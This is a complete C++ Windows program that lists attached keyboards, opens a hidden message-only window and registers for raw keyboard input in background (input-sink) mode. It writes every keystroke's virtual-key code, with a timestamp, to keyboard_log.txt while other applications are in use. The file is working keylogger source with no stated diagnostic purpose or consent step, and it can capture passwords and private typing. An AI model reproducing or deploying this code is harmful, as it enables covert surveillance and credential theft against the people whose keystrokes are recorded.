#include <windows.h>
#include <initguid.h>
#include <devguid.h>
#include <setupapi.h>
#include <stdio.h>
#include <string>
#include <vector>
#include <fstream>
#include <iostream>

#pragma comment(lib, "setupapi.lib")

DEFINE_GUID(GUID_DEVINTERFACE_KEYBOARD,
    0x884b96c3, 0x56ef, 0x11d1,
    0xbc, 0x8c, 0x00, 0xa0, 0xc9, 0x14, 0x05, 0xdd);

std::vector<std::string> knownKeyboards;
std::ofstream logFile("keyboard_log.txt", std::ios::app);

// List keyboard device paths
std::vector<std::string> ListKeyboardDevices() {
    std::vector<std::string> keyboardPaths;
    HDEVINFO deviceInfo = SetupDiGetClassDevs(&GUID_DEVINTERFACE_KEYBOARD, NULL, NULL, DIGCF_PRESENT | DIGCF_DEVICEINTERFACE);
    if (deviceInfo == INVALID_HANDLE_VALUE) return keyboardPaths;

    SP_DEVICE_INTERFACE_DATA devInterfaceData = {};
    devInterfaceData.cbSize = sizeof(SP_DEVICE_INTERFACE_DATA);

    for (DWORD i = 0; SetupDiEnumDeviceInterfaces(deviceInfo, NULL, &GUID_DEVINTERFACE_KEYBOARD, i, &devInterfaceData); ++i) {
        DWORD requiredSize = 0;
        SetupDiGetDeviceInterfaceDetail(deviceInfo, &devInterfaceData, NULL, 0, &requiredSize, NULL);
        PSP_DEVICE_INTERFACE_DETAIL_DATA devDetail = (PSP_DEVICE_INTERFACE_DETAIL_DATA)malloc(requiredSize);
        if (!devDetail) continue;

        devDetail->cbSize = sizeof(SP_DEVICE_INTERFACE_DETAIL_DATA);
        if (SetupDiGetDeviceInterfaceDetail(deviceInfo, &devInterfaceData, devDetail, requiredSize, NULL, NULL)) {
            keyboardPaths.push_back(devDetail->DevicePath);
            std::cout << "Device Path: " << devDetail->DevicePath << std::endl;
        }

        free(devDetail);
    }

    SetupDiDestroyDeviceInfoList(deviceInfo);
    return keyboardPaths;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (msg == WM_INPUT) {
        UINT dwSize = 0;
        GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &dwSize, sizeof(RAWINPUTHEADER));
        LPBYTE lpb = new BYTE[dwSize];
        if (!lpb) return 0;

        if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, lpb, &dwSize, sizeof(RAWINPUTHEADER)) == dwSize) {
            RAWINPUT* raw = (RAWINPUT*)lpb;
            if (raw->header.dwType == RIM_TYPEKEYBOARD) {
                HANDLE hDevice = raw->header.hDevice;

                UINT nameSize = 0;
                GetRawInputDeviceInfo(hDevice, RIDI_DEVICENAME, NULL, &nameSize);
                std::vector<char> nameBuf(nameSize);
                GetRawInputDeviceInfo(hDevice, RIDI_DEVICENAME, nameBuf.data(), &nameSize);
                std::string devicePath(nameBuf.data());

                for (const auto& known : knownKeyboards) {
                    if (devicePath == known) {
                        // Log VK code with timestamp
                        SYSTEMTIME st;
                        GetLocalTime(&st);
                        logFile << "[" << st.wHour << ":" << st.wMinute << ":" << st.wSecond << "] "
                                << "VK: " << raw->data.keyboard.VKey << "\n";
                        logFile.flush();
                        break;
                    }
                }
            }
        }

        delete[] lpb;
        return 0;
    }

    return DefWindowProc(hwnd, msg, wParam, lParam);
}

int main() {
    std::cout << "Listing keyboard devices...\n";
    knownKeyboards = ListKeyboardDevices();
    if (knownKeyboards.empty()) {
        fprintf(stderr, "No keyboard devices found.\n");
        return 1;
    }

    HINSTANCE hInstance = GetModuleHandle(NULL);

    const char CLASS_NAME[] = "RawInputLoggerClass";
    WNDCLASS wc = {};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;

    if (!RegisterClass(&wc)) {
        fprintf(stderr, "Failed to register window class.\n");
        return 1;
    }

    HWND hwnd = CreateWindowEx(0, CLASS_NAME, NULL, 0,
        0, 0, 0, 0, HWND_MESSAGE, NULL, hInstance, NULL);

    if (!hwnd) {
        fprintf(stderr, "Failed to create message-only window.\n");
        return 1;
    }

    // Register for raw input from keyboards
    RAWINPUTDEVICE rid;
    rid.usUsagePage = 0x01; // Generic desktop controls
    rid.usUsage = 0x06;     // Keyboard
    rid.dwFlags = RIDEV_INPUTSINK;
    rid.hwndTarget = hwnd;

    if (!RegisterRawInputDevices(&rid, 1, sizeof(rid))) {
        fprintf(stderr, "Failed to register for raw input.\n");
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    logFile.close();
    return 0;
}

